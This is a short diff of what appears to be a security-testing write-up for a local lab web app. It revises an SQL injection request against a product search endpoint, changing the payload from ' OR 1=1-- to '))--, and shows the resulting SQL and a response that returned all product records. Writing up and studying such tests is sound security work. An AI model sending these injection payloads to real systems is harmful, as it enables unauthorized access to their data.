@@ -60,13 +60,13 @@ Using the confirmed query structure, a boolean injection payload was crafted to 
 
 Request:
 ```http
-GET /rest/products/search?q=' OR 1=1-- HTTP/1.1
+GET /rest/products/search?q='))-- HTTP/1.1
 Host: localhost:3000
 ```
 
 Resulting SQL:
 ```sql
-SELECT * FROM Products WHERE ((name LIKE '%' OR 1=1--...
+SELECT * FROM Products WHERE ((name LIKE '%'))--...
 ```
 
 Response: 200 OK — returned all 46 product records.
